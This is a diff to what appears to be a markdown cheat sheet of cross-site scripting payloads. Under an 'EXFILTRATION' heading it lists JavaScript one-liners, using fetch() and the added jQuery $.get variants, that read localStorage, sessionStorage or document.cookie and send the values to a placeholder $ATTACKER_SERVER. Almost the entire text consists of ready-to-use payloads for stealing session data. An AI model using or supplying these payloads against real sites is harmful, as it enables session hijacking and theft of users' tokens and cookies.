@@ -5,6 +5,7 @@ Instead of using alert() for your XSS payloads, I encourage you to check out som
 
 
 # EXFILTRATION
+## FETCH
 ### GET VALUE FROM LOCAL STORAGE AND $FETCH:
 ```javascript
 fetch("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
@@ -16,4 +17,17 @@ fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCA
 ### GET COOKIES AND $FETCH
 ```javascript
 fetch("https://$ATTACKER_SERVER/?exfil="+document.cookie)
+```
+## JQuery AJAX
+### GET VALUE FROM LOCAL STORAGE AND $.GET
+```javascript
+$.get("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
+```
+### GET VALUE FROM SESSION STORAGE AND $.GET:
+```javascript
+$.get("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
+```
+### GET COOKIES AND $.GET
+```javascript
+$.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
 ```
